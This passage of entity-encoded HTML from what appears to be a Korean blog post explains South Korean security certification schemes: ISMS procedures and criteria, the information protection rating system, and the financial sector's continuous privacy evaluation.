&#xACFC;&#xD0DC;&#xB8CC;</strong>&#xAC00; &#xBD80;&#xACFC;&#xB429;&#xB2C8;&#xB2E4;.<br><img src="/2024/07/07/romi0x/certification_security/002.png" alt="&#xC0AC;&#xC9C4;"></p></li></ul><ul><li><p><strong>&#xC790;&#xC728; &#xC2E0;&#xCCAD; &#xB300;&#xC0C1;&#xC790;</strong></p><ul><li><p>&#xC758;&#xBB34;&#xB300;&#xC0C1;&#xC790; &#xAE30;&#xC900;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xB098; <strong>&#xC790;&#xBC1C;&#xC801;&#xC73C;&#xB85C; &#xC2E0;&#xCCAD;</strong>&#xD558;&#xC5EC; &#xC778;&#xC99D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xC784;&#xC758;&#xC2E0;&#xCCAD;&#xC790;&#xB85C; &#xBD84;&#xB958;&#xB429;&#xB2C8;&#xB2E4;.</p><p>  &#xC989;, &#xC784;&#xC758;&#xC2E0;&#xCCAD;&#xC790;&#xAC00; &#xC778;&#xC99D; &#xCDE8;&#xB4DD;&#xC744; &#xD76C;&#xB9DD;&#xD560; &#xACBD;&#xC6B0; <strong>&#xC790;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xC2E0;&#xCCAD;</strong>&#xD558;&#xC5EC; &#xC778;&#xC99D;&#xC2EC;&#xC0AC;&#xB97C; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p></li></ul></li></ul></li></ul></li><li><p>&#xD3C9;&#xAC00; &#xC808;&#xCC28; </p><p>  &#xD3C9;&#xAC00;&#xC808;&#xCC28;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p><p>  <img src="/2024/07/07/romi0x/certification_security/image4.png" alt="&#xC0AC;&#xC9C4;"><br>  <a href="https://isms.kisa.or.kr/main/ispims/request/">&#xC0AC;&#xC9C4; &#xCD9C;&#xCC98;</a></p><p>  &#xC778;&#xC99D;&#xC2EC;&#xC0AC; &#xC2E0;&#xCCAD; &#xC2DC; &#xAE30;&#xAD00;&#xC740; <a href="https://isms.kisa.or.kr/main/ispims/notice/">&#xD544;&#xC694;&#xD55C; &#xC11C;&#xB958;</a>&#xB4E4;&#xC744; &#xC900;&#xBE44;&#xD558;&#xC5EC; &#xC778;&#xC99D;&#xAE30;&#xAD00; &#xB610;&#xB294; &#xC2EC;&#xC0AC;&#xAE30;&#xAD00;&#xC5D0; &#xC81C;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC138;&#xBD80; &#xC808;&#xCC28;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC544;&#xC694;.</p><ul><li>&#xC2E0;&#xCCAD; &#xB2E8;&#xACC4; : &#xC2E0;&#xCCAD;&#xACF5;&#xBB38; + &#xC778;&#xC99D;&#xC2E0;&#xCCAD;&#xC11C;, &#xAD00;&#xB9AC;&#xCCB4;&#xACC4;&#xC6B4;&#xC601;&#xBA85;&#xC138;&#xC11C;, &#xBC95;&#xC778;/&#xAC1C;&#xC778; &#xC0AC;&#xC5C5;&#xC790; &#xB4F1;&#xB85D;&#xC99D;</li><li>&#xACC4;&#xC57D; &#xB2E8;&#xACC4; : &#xC218;&#xC218;&#xB8CC; &#xC0B0;&#xC815; &gt; &#xACC4;&#xC57D; &gt; &#xC218;&#xC218;&#xB8CC; &#xB0A9;&#xBD80;</li><li>&#xC2EC;&#xC0AC; &#xB2E8;&#xACC4; : &#xC778;&#xC99D;&#xC2EC;&#xC0AC; &gt; &#xACB0;&#xD568;&#xBCF4;&#xACE0;&#xC11C; &gt; &#xBCF4;&#xC644;&#xC870;&#xCE58;&#xB0B4;&#xC5ED;&#xC11C;</li><li>&#xC778;&#xC99D; &#xB2E8;&#xACC4; : &#xCD5C;&#xCD08;/&#xAC31;&#xC2E0;&#xC2EC;&#xC0AC; &#xC2EC;&#xC758; &#xC758;&#xACB0;(&#xC778;&#xC99D;&#xC704;&#xC6D0;&#xD68C;), &#xC720;&#xC9C0;(&#xC778;&#xC99D;&#xAE30;&#xAD00;)</li></ul></li><li><p>&#xC778;&#xC99D; &#xAE30;&#xC900;</p><p><img src="/2024/07/07/romi0x/certification_security/image5.png" alt="&#xC0AC;&#xC9C4;"></p><p><a href="https://isms.kisa.or.kr/main/ispims/intro/">&#xC0AC;&#xC9C4; &#xCD9C;&#xCC98;</a></p><p>ISMS&#xC758; &#xACBD;&#xC6B0; &#x2018;<strong>&#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC218;&#xB9BD; &#xBC0F; &#xC6B4;&#xC601;</strong>&#x2019; &#xACFC; &#x2018;<strong>&#xBCF4;&#xD638;&#xB300;&#xCC45; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;</strong>&#x2019;&#xC774; &#xD574;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;.<br><img src="/2024/07/07/romi0x/certification_security/003.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xAD04;&#xD638; &#xC548;&#xC5D0; &#xC22B;&#xC790;&#xB294; &#xC778;&#xC99D;&#xAE30;&#xC900; &#xAC1C;&#xC218;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xC694;.</p><p><a href="https://isms.kisa.or.kr/main/ispims/notice/?boardId=bbs_0000000000000014&amp;mode=view&amp;cntId=21">2&#xAC00;&#xC9C0; &#xC778;&#xC99D;&#xAE30;&#xC900;&#xC73C;&#xB85C; &#xCD1D; 80&#xAC1C;&#xC758; &#xC778;&#xC99D;&#xAE30;&#xC900;&#xC774; &#xC788;&#xC5B4;&#xC694;.</a></p></li></ul><ul><li>&#xC778;&#xC99D; &#xD61C;&#xD0DD;<ul><li>&#xC778;&#xC99D;&#xC744; &#xBC1B;&#xB294;&#xB2E4;&#xBA74; 4&#xAC1C;&#xC758; &#xAE30;&#xAD00;&#xC5D0;&#xC11C; &#xD61C;&#xD0DD;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC5B4;&#xC694;.<br><img src="/2024/07/07/romi0x/certification_security/004.png" alt="&#xC0AC;&#xC9C4;"></li></ul></li></ul><h2 id="2&#xFE0F;-&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB4F1;&#xAE09;&#xC81C;"><a href="#2&#xFE0F;-&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB4F1;&#xAE09;&#xC81C;" class="headerlink" title="2&#xFE0F;. &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB4F1;&#xAE09;&#xC81C;"></a>2&#xFE0F;. &#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB4F1;&#xAE09;&#xC81C;</h2><p><img src="/2024/07/07/romi0x/certification_security/image6.png" alt="&#xC0AC;&#xC9C4;"></p><ul><li>&#xC815;&#xC758;<ul><li><strong>&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB4F1;&#xAE09;&#xC81C;&#xB294; &#xC815;<em>&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4;(ISMS)&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xB294; &#xAE30;&#xC5C5; &#xB300;&#xC0C1;</em></strong>&#xC73C;&#xB85C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC218;&#xC900;&#xC744; &#xCE21;&#xC815;&#xD558;&#xC5EC; <strong>&#x2018;&#xC6B0;&#xC218;&#x2019;, &#x2018;&#xCD5C;&#xC6B0;&#xC218;&#x2019;</strong> &#xB4F1;&#xAE09;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xB294; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB4F1;&#xAE09;&#xC81C;&#xB97C; &#xD1B5;&#xD574; &#xB192;&#xC740; &#xB4F1;&#xAE09;&#xC744; &#xBC1B;&#xC73C;&#xBA74; <em>&#xAE30;&#xC5C5;&#xC758; &#xC2E0;&#xB8B0;&#xC131;, &#xACBD;&#xC7C1;&#xB825;, &#xBC95;&#xC801; &#xC900;&#xC218;, &#xC0AC;&#xC774;&#xBC84; &#xBC29;&#xC5B4;&#xB825;, &#xACE0;&#xAC1D; &#xB9CC;&#xC871;&#xB3C4;, &#xC2DC;&#xC7A5; &#xD3C9;&#xD310;, &#xAE00;&#xB85C;&#xBC8C; &#xC9C4;&#xCD9C;, &#xB0B4;&#xBD80; &#xAD00;&#xB9AC;</em>&#xAC00; &#xBAA8;&#xB450; &#xD5A5;&#xC0C1;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>&#xC778;&#xC99D; &#xCD94;&#xC9C4; &#xAE30;&#xAD00;</p><p>&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xB4F1;&#xAE09;&#xC81C;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xAE30;&#xAD00;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p>  <table>    <tr>      <td>&#xC815;&#xCC45;&#xAE30;&#xAD00;</td>      <td><a href="https://www.msit.go.kr/">&#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80;</a></td>      <td>- &#xBC95;, &#xC81C;&#xB3C4; &#xAC1C;&#xC120; &#xBC0F; &#xC815;&#xCC45; &#xACB0;&#xC815;</td>    </tr>    <tr>      <td>&#xC778;&#xC99D;&#xAE30;&#xAD00;</td>      <td><a href="https://www.kisa.or.kr/">&#xD55C;&#xAD6D;&#xC778;&#xD130;&#xB137;&#xC9C4;&#xD765;&#xC6D0;(KISA)</a></td>      <td>- &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xB4F1;&#xAE09; &#xC81C;&#xB3C4; &#xC6B4;&#xC601;<br>- &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xB4F1;&#xAE09; &#xC2EC;&#xC0AC; &#xC218;&#xD589;<br>- &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xB4F1;&#xAE09; &#xC704;&#xC6D0;&#xD68C; &#xC6B4;&#xC601;</td>    </tr>    <tr>      <td>&#xC2EC;&#xC0AC;&#xAE30;&#xAD00;</td>      <td>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xB4F1;&#xAE09; &#xC704;&#xC6D0;&#xD68C;</td>      <td>- &#xB4F1;&#xAE09; &#xC2EC;&#xC0AC; &#xACB0;&#xACFC; &#xC2EC;&#xC758; &#xFE52;&#xC758;&#xACB0;</td>    </tr>  </table></li><li><p>&#xAD00;&#xB828; &#xBC95;&#xB839;</p><p>&#xAD00;&#xB828; &#xBC95;&#xB839;&#xC740; 3&#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xC5B4;&#xC694;.</p><ul><li>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD; &#xC774;&#xC6A9;&#xCD09;&#xC9C4; &#xBC0F; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xB4F1;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960; &#xC81C;47&#xC870;&#xC758; 5</li><li>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD; &#xC774;&#xC6A9;&#xCD09;&#xC9C4; &#xBC0F; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xB4F1;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960; &#xC2DC;&#xD589;&#xB839; &#xC81C;55&#xC870;&#xC758; 2~&#xC81C;55&#xC870;&#xC758; 5</li><li>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xB4F1;&#xAE09; &#xBD80;&#xC5EC;&#xC5D0; &#xAD00;&#xD55C; &#xACE0;&#xC2DC;(&#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80; &#xC81C;2016-40&#xD638;)</li></ul></li></ul><ul><li><p>&#xC778;&#xC99D; &#xB300;&#xC0C1;</p><ul><li>&#xC778;&#xC99D; &#xBC94;&#xC704;&#xC640; &#xC778;&#xC99D; &#xC720;&#xC9C0;&#xAE30;&#xAC04;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.<ul><li>&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xAD00;&#xB9AC;&#xCCB4;&#xACC4;(ISMS) &#xC778;&#xC99D; &#xBC94;&#xC704;<ul><li>&#xC804;&#xC0AC;(&#x5168;&#x793E;) &#xBC94;&#xC704;&#xB85C; 1&#xB144; &#xC774;&#xC0C1; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4;&#xB97C; &#xC6B4;&#xC601;(1&#xB144;&#xC740; &#xD68C;&#xACC4;&#xB144;&#xB3C4;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xAE30;&#xAC04;&#xC744; &#xB9D0;&#xD568;)</li></ul></li><li>&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xAD00;&#xB9AC;&#xCCB4;&#xACC4;(ISMS) &#xC778;&#xC99D; &#xC720;&#xC9C0;&#xAE30;&#xAC04;<ul><li>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC778;&#xC99D;&#xC744; 3&#xB144;&#xAC04; &#xC5F0;&#xC18D;&#xC73C;&#xB85C; &#xC720;&#xC9C0;</li></ul></li></ul></li></ul></li><li><p>&#xD3C9;&#xAC00; &#xC808;&#xCC28;</p><p><img src="/2024/07/07/romi0x/certification_security/image7.png" alt="&#xC0AC;&#xC9C4;"></p><p><a href="https://isms.kisa.or.kr/main/isrs/request/">&#xC0AC;&#xC9C4; &#xCD9C;&#xCC98;</a></p><p>&#xC778;&#xC99D;&#xC2EC;&#xC0AC; &#xC808;&#xCC28;&#xB294; <strong>&#xC778;&#xC99D;&#xC2E0;&#xCCAD; &#xBC0F; &#xACC4;&#xC57D;, &#xC2EC;&#xC0AC;&#xD300; &#xAD6C;&#xC131;, &#xC778;&#xC99D;&#xC2EC;&#xC0AC;, &#xBCF4;&#xC644;&#xC870;&#xCE58; &#xBC0F; &#xD655;&#xC778;, &#xC778;&#xC99D;&#xC704;&#xC6D0;&#xD68C; &#xC2EC;&#xC758;, &#xC778;&#xC99D;&#xBD80;&#xC5EC;</strong> &#xB4F1; &#xD06C;&#xAC8C; 6&#xB2E8;&#xACC4;&#xB85C; &#xAD6C;&#xC131;&#xB3FC;&#xC694;.</p></li><li><p>&#xC778;&#xC99D; &#xC2EC;&#xC0AC; &#xAE30;&#xC900;<br><img src="/2024/07/07/romi0x/certification_security/007.png" alt="&#xC0AC;&#xC9C4;"></p></li></ul><ul><li><p>&#xB4F1;&#xAE09; &#xBD80;&#xC5EC; &#xAE30;&#xC900;</p><p><strong>&#x2018;&#xCD5C;&#xC6B0;&#xC218;&#x2019;&#xC640; &#x2018;&#xC6B0;&#xC218;&#x2019; &#xB4F1;&#xAE09;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xB294; &#xAE30;&#xC900;</strong>&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p><ul><li>&#xCD5C;&#xC6B0;&#xC218;<ul><li>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xD1B5;&#xC81C; &#xD65C;&#xB3D9;&#xC5D0;&#xC11C; &#xC5BB;&#xC5B4;&#xC9C4; <strong>&#xBB38;&#xC81C;&#xC810;&#xC744; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xAC1C;&#xC120;&#xD558;&#xC5EC; &#xBC18;&#xC601;&#xD568;&#xC73C;&#xB85C;&#xC11C; &#xAE30;&#xC5C5;&#xC758; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC218;&#xC900;&#xC744; &#xCD5C;&#xC801;&#xD654;&#xD558;&#xB294; &#xB2E8;&#xACC4;</strong></li></ul></li><li>&#xC6B0;&#xC218; <ul><li>&#xAE30;&#xC5C5;&#xC5D0; &#xB0B4;&#xC7AC;&#xB41C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xD1B5;&#xC81C; &#xBC0F; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; <strong>&#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xCE21;&#xC815;, &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xB85C; &#xC815;&#xAE30;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC0C1;&#xD0DC;&#xB97C; &#xC810;&#xAC80;&#xD558;&#xB294; &#xB2E8;&#xACC4;</strong></li></ul></li></ul></li></ul><h3 id="&#xBC88;&#xC678;-ISMS-vs-&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xAD00;&#xB9AC;&#xB4F1;&#xAE09;&#xC81C;"><a href="#&#xBC88;&#xC678;-ISMS-vs-&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xAD00;&#xB9AC;&#xB4F1;&#xAE09;&#xC81C;" class="headerlink" title="&#xBC88;&#xC678;) ISMS vs &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xB4F1;&#xAE09;&#xC81C;"></a>&#xBC88;&#xC678;) ISMS vs &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xB4F1;&#xAE09;&#xC81C;</h3><p>&#xBC88;&#xC678;&#xB85C; ISMS&#xC640; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xB4F1;&#xAE09;&#xC81C;&#xAC00; &#xBB50;&#xAC00; &#xB2E4;&#xB978;&#xC9C0; &#xD45C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?!&#x1F44C;<br><img src="/2024/07/07/romi0x/certification_security/009.png" alt="&#xC0AC;&#xC9C4;"></p><h2 id="3&#xFE0F;-&#xAE08;&#xC735;&#xAD8C;-&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xC0C1;&#xC2DC;&#xD3C9;&#xAC00;&#xC81C;"><a href="#3&#xFE0F;-&#xAE08;&#xC735;&#xAD8C;-&#xC815;&#xBCF4;&#xBCF4;&#xD638;-&#xC0C1;&#xC2DC;&#xD3C9;&#xAC00;&#xC81C;" class="headerlink" title="3&#xFE0F;. &#xAE08;&#xC735;&#xAD8C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC0C1;&#xC2DC;&#xD3C9;&#xAC00;&#xC81C;"></a>3&#xFE0F;. <strong>&#xAE08;&#xC735;&#xAD8C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC0C1;&#xC2DC;&#xD3C9;&#xAC00;&#xC81C;</strong></h2><p><img src="/2024/07/07/romi0x/certification_security/image8.png" alt="&#xC0AC;&#xC9C4;"></p><ul><li>&#xC815;&#xC758;<ul><li>&#xAE08;&#xC735;&#xAD8C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC0C1;&#xC2DC;&#xD3C9;&#xAC00;&#xC81C;&#xB294; <strong>&#xAE08;&#xC735;&#xD68C;&#xC0AC;</strong>&#xC758; &#xAC1C;&#xC778;&#xC2E0;&#xC6A9;&#xC815;&#xBCF4; &#xD65C;&#xC6A9;&#x318D;&#xAD00;&#xB9AC; &#xC2E4;&#xD0DC;&#xC810;&#xAC80;(&#xC790;&#xCCB4;&#xD3C9;&#xAC00;) &#xACB0;&#xACFC;&#xB97C; &#xC811;&#xC218;&#xD558;&#xACE0;, &#xADF8; &#xC810;&#xAC80; &#xACB0;&#xACFC;&#xC5D0; &#xB300;&#xD574; &#xC11C;&#xBA74;&#xC810;&#xAC80; &#xC218;&#xD589; &#xBC0F; &#xC810;&#xC218;&#x318D;&#xB4F1;&#xAE09; &#xBD80;&#xC5EC;&#xD558;&#xB294; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xB3D9;&#xC758;&#xB7;&#xC218;&#xC9D1;&#xB7;&#xC81C;&#xACF5; &#xB4F1; <strong>&#xC815;&#xBCF4;&#xC758; &#xC0DD;&#xC560;&#xC8FC;&#xAE30;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xADDC;&#xC81C;</strong>&#xB97C; &#xCCB4;&#xACC4;&#xC801;&#xB7;&#xC0C1;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC900;&#xC218;&#xB7;&#xAC80;&#xC99D;&#xD560; &#xC218; &#xC788;&#xB294; &#xD3C9;&#xAC00;&#xCCB4;&#xACC4;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>&#xC778;&#xC99D; &#xCD94;&#xC9C4; &#xAE30;&#xAD00;</p>  <table>    <tbody>      <tr>        <td>&#xB300;&#xC0C1;&#xAE30;&#xAD00;</td>        <td>&#xAE08;&#xC735;&#xD68C;&#xC0AC;</td>        <td>&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xCDE8;&#xC57D;&#xC810; &#xC790;&#xC728;&#xC9C4;&#xB2E8;</td>      </tr>      <tr>        <td>&#xC2EC;&#xC0AC;&#xAE30;&#xAD00;</td>        <td>&#xAE08;&#xC735;&#xBCF4;&#xC548;&#xC6D0;</td>        <td>- &#xC11C;&#xBA74;&#xC810;&#xAC80;<br>- &#xC810;&#xC218; &#xBC0F; &#xB4F1;&#xAE09;&#xD654;<br>- &#xC790;&#xCCB4;&#xD3C9;&#xAC00; &#xC9C0;&#xC6D0;<br>- &#xCDE8;&#xC57D;&#xC810; &#xCEE8;&#xC124;&#xD305;</td>      </tr>      <tr>        <td>&#xC778;&#xC99D;&#xAE30;&#xAD00;</td>        <td>&#xAE08;&#xC735;&#xC704;&#xC6D0;&#xD68C;, &#xAE08;&#xC735;&#xAC10;&#xB3C5;&#xC6D0;</td>        <td>- &#xAE08;&#xC735;&#xD68C;&#xC0AC; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC218;&#xC900; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;<br>- &#xC810;&#xAC80;&#xACB0;&#xACFC;&#xB97C; &#xD604;&#xC7A5;&#xC810;&#xAC80;, &#xD14C;&#xB9C8;&#xAC80;&#xC0AC; &#xB4F1;&#xC5D0; &#xD65C;&#xC6A9;</td>      </tr>    </tbody>  </table></li></ul><ul><li>&#xAD00;&#xB828; &#xBC95;&#xB839;<ul><li>&#x300C;&#xC2E0;&#xC6A9;&#xC815;&#xBCF4;&#xC758; &#xC774;&#xC6A9; &#xBC0F; &#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960;&#x300D;<ul><li>&#xC81C;20&#xC870;(&#xC2E0;&#xC6A9;&#xC815;&#xBCF4; &#xAD00;&#xB9AC;&#xCC45;&#xC784;&#xC758; &#xBA85;&#xD655;&#xD654; &#xBC0F; &#xC5C5;&#xBB34;&#xCC98;&#xB9AC;&#xAE30;&#xB85D;&#xC758; &#xBCF4;&#xC874;)&#xC81C;6&#xD56D;</li><li>&#xC81C;45&#xC870;&#xC758;5(&#xAC1C;&#xC778;&#xC2E0;&#xC6A9;&#xC815;&#xBCF4; &#xD65C;&#xC6A9;&#xB7;&#xAD00;&#xB9AC; &#xC2E4;&#xD0DC;&#xC5D0; &#xB300;&#xD55C; &#xC0C1;&#xC2DC;&#xD3C9;&#xAC00;)</li></ul></li></ul></li></ul><ul><li><p>&#xC778;&#xC99D; &#xB300;&#xC0C1;</p><p><strong>&#xC2E0;&#xC6A9;&#xC815;&#xBCF4;&#xBC95; &#xC2DC;&#xD589;&#xB839; &#xC81C;17&#xC870;&#xC81C;7&#xD56D;&#xC5D0;&#xC11C; &#xADDC;&#xC815;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAE30;&#xAD00;</strong>&#xC73C;&#xB85C; &#xAE08;&#xC735;&#xC9C0;&#xC8FC;&#xB7;&#xC740;&#xD589;&#xB7;&#xBCF4;&#xD5D8;&#xB7;&#xAE08;&#xC735;&#xD22C;&#xC790;&#xB7;&#xC5EC;&#xC2E0;&#xAE08;&#xC735;&#xB7;&#xC800;&#xCD95;&#xC740;&#xD589;&#xB7;&#xC0C1;&#xD638;&#xAE08;&#xC735;&#xB7;&#xB300;&#xBD80;&#xC5C5;&#xB7;&#xC2E0;&#xC6A9;&#xC815;&#xBCF4;&#xD68C;&#xC0AC; &#xB4F1;&#xB7;&#xACF5;&#xACF5;&#xAE30;&#xAD00; &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xB9AC;&#xAC00; &#xC544;&#xB294; &#xC2E0;&#xD55C;&#xC740;&#xD589;, &#xAD6D;&#xBBFC;&#xC740;&#xD589;, &#xC0BC;&#xC131;&#xC0DD;&#xBA85;, &#xB86F;&#xB370;&#xCE74;&#xB4DC;, SBI&#xC800;&#xCD95;&#xC740;&#xD589; &#xB4F1;&#xC774; &#xD574;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xD3C9;&#xAC00; &#xC808;&#xCC28;</p><p>&#xAE08;&#xC735;&#xAD8C;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC2E4;&#xD0DC; &#xC810;&#xAC80;&#xC744; 3&#xB2E8;&#xACC4;&#xB85C; &#xC138;&#xBD84;&#xD654;&#xD558;&#xACE0;, &#xC810;&#xAC80;&#xACB0;&#xACFC;&#xC5D0; &#xB300;&#xD574; &#xD53C;&#xB4DC;&#xBC31;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC790;&#xCCB4;&#xD3C9;&#xAC00;<ul><li>&#xAE08;&#xC735;&#xD68C;&#xC0AC; &#xB4F1;&#xC740; &#xC9C1;&#xC804;&#xC5F0;&#xB3C4; &#xAC1C;&#xC778;&#xC2E0;&#xC6A9;&#xC815;&#xBCF4; &#xBCF4;&#xD638; &#xC2E4;&#xD0DC;&#xC5D0; &#xB300;&#xD55C; &#xC790;&#xCCB4;&#xD3C9;&#xAC00;&#xB97C; &#xC218;&#xD589;&#xD558;&#xACE0; &#xAE08;&#xC735;&#xBCF4;&#xC548;&#xC6D0;&#xC5D0; &#xACB0;&#xACFC; &#xC81C;&#xCD9C;</li></ul></li><li>&#xC810;&#xC218; &#xBC0F; &#xB4F1;&#xAE09;&#xBD80;&#xC5EC;<ul><li>&#xAE08;&#xC735;&#xBCF4;&#xC548;&#xC6D0;&#xC740; &#xAE08;&#xC735;&#xD68C;&#xC0AC;&#xC758; &#xC81C;&#xCD9C;&#xB0B4;&#xC5ED;&#xC5D0; &#xB300;&#xD574; &#xC810;&#xAC80;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0;, &#xC810;&#xAC80;&#xACB0;&#xACFC;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC810;&#xC218;&#x2022;&#xB4F1;&#xAE09; &#xBD80;&#xC5EC;</li></ul></li><li>&#xAC10;&#xB3C5;&#x2022;&#xAC80;&#xC0AC;<ul><li>&#xAE08;&#xC735;&#xB2F9;&#xAD6D;&#xC740; &#xAE08;&#xC735;&#xD68C;&#xC0AC; &#xB4F1;&#xC758; &#xD3C9;&#xAC00;&#xACB0;&#xACFC;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD604;&#xC7A5; &#xC810;&#xAC80;, &#xD14C;&#xB9C8;&#xAC80;&#xC0AC; &#xB4F1; &#xCDE8;&#xC57D;&#xC810; &#xBCF4;&#xC644; &#xC870;&#xCE58;&#xB97C; &#xC218;&#xD589;</li></ul></li></ol></li></ul><ul><li><p>&#xC778;&#xC99D; &#xAE30;&#xC900;</p><ul><li><p>&#xAE08;&#xC735;&#xAD8C; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC2E4;&#xD0DC;&#xB97C; &#xBA74;&#xBC00;&#xD788; &#xC810;&#xAC80;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC810;&#xAC80;&#xD56D;&#xBAA9;&#xC744; <strong>9&#xAC1C; &#xB300;&#xD56D;&#xBAA9;, 143&#xAC1C; &#xC18C;&#xD56D;&#xBAA9;</strong>&#xC73C;&#xB85C; &#xC815;&#xBC00;&#xD558;&#xAC8C; &#xAD6C;&#xBD84;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;.</p><ol><li>&#xB3D9;&#xC758;&#xC6D0;&#xCE59; (10&#xAC1C;)</li><li>&#xC218;&#xC9D1; (3&#xAC1C;)</li><li>&#xC81C;&#xACF5; (5&#xAC1C;)</li><li>&#xBCF4;&#xC720;&#xB7;&#xC0AD;&#xC81C; (12&#xAC1C;)</li><li>&#xAD8C;&#xB9AC;&#xBCF4;&#xC7A5; (15&#xAC1C;)</li><li>&#xCC98;&#xB9AC;&#xC704;&#xD0C1; (4&#xAC1C;)</li><li>&#xAD00;&#xB9AC;&#xC801; &#xBCF4;&#xD638;&#xC870;&#xCE58; (44&#xAC1C;)</li><li>&#xAE30;&#xC220;&#xC801; &#xBCF4;&#xD638;&#xC870;&#xCE58; (35&#xAC1C;)</li><li>&#xAC00;&#xBA85;&#xC815;&#xBCF4; 